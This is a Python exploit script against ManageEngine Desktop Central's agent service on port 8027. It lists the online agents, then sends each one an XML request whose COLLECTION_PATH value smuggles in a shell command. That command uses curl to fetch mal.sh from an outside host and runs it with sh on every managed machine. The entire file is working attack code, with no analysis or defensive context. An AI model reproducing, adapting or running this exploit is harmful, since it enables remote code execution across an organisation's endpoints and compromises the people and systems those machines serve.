#!/usr/bin/env python3

import socket
import select
import re

TCP_IP = '192.168.17.57' # Replace with Manage Engine Desktop Central server IP address
TCP_PORT = 8027
BUFFER_SIZE = 1024 # may need to be increased if there are lots of agents

def recv_timeout(sock, timeout_seconds): 
    sock.setblocking(0)
    ready = select.select([sock], [], [], timeout_seconds) 
    if ready[0]: 
        return sock.recv(BUFFER_SIZE)

def connectTo8027(message):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((TCP_IP, TCP_PORT))
        print(message)
        s.send(message)
        data = recv_timeout(s, 2)
        s.close()
        return data
    except ConnectionResetError:
        pass
    except ConnectionRefusedError:
        print("ConnectionRefusedError")

def getClientID(listofonlineagents):
    searchedvalue = re.search('{(.*)}', listofonlineagents.decode("utf-8"))
    valuematch = (searchedvalue.group(1))
    splitvalues = valuematch.rstrip(",").split(",")
    clientlist = []
    for x in splitvalues:
        liveclientnumber = x.split(":")
        clientlist.append(liveclientnumber[0])
    
    return clientlist


def main():
    # Command to get list of online agents
    listofonlineagents = b"""/L=1347"""

    payloadMac = b"""/p=1613470134700;encStatus=true;clientList=CLIENTID;<?xml version="1.0" 
    encoding="utf-8"?><AgentRequest>
    <AgentRequestParams agent_request_param_id="1" param_name="COLLECTION_PATH" 
    param_value="x' | curl https://leat.uk/mal.sh > /tmp/mal.sh ; sh /tmp/mal.sh ' "/>
    <AgentRequestCommand agent_request_id="chris@leat.me" request_command="8"/>
    </AgentRequest>"""

    # Send command to get list of online agents
    getlistofagents = connectTo8027(listofonlineagents)

    # Generate list of clientid from the server
    clientlist = getClientID(getlistofagents)

    for client in clientlist:
        # Replace CLIENTID with the actual clientid returned by the server
        payloadMacreplace = payloadMac.replace(b'CLIENTID', bytes(client, encoding='utf8'))
        # Send payload with updated actual clientid to server
        connectTo8027(payloadMacreplace)

if __name__ == "__main__":
    main()
